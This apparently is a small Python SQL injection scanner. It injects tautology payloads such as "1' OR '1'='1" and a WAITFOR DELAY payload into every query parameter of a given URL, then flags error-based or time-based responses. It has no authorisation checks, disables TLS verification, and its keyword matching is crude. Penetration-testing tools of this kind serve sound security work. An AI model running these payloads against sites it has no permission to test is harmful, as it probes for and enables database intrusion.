import argparse
import requests
import urllib.parse
import concurrent.futures
import time

def test_injection(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    query[param] = payload
    new_query = urllib.parse.urlencode(query, doseq=True)
    target = parsed._replace(query=new_query).geturl()
    try:
        start = time.time()
        r = requests.get(target, timeout=10, verify=False)
        duration = time.time() - start
        errors = ['mysql', 'syntax error', 'sql', 'odbc', 'postgres']
        if any(err in r.text.lower() for err in errors):
            return param, payload, 'error-based'
        if duration > 5:
            return param, payload, 'time-based'
    except:
        pass
    return None

def discover_params(url):
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query).keys())

def main():
    parser = argparse.ArgumentParser(description="Professional SQL Injection Scanner")
    parser.add_argument("url")
    args = parser.parse_args()
    params = discover_params(args.url)
    payloads = ["1' OR '1'='1", "' OR '1'='1' -- ", "'; WAITFOR DELAY '0:0:6' --", "\" OR \"\" = \""]
    findings = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_injection, args.url, p, pl) for p in params for pl in payloads]
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            if res:
                findings.append(res)
    if findings:
        for param, pl, kind in set(findings):
            print(f"Vulnerability found on parameter '{param}' with payload '{pl}' ({kind} injection)")
    else:
        print("No SQL injection vulnerabilities detected")

if __name__ == "__main__":
    main()
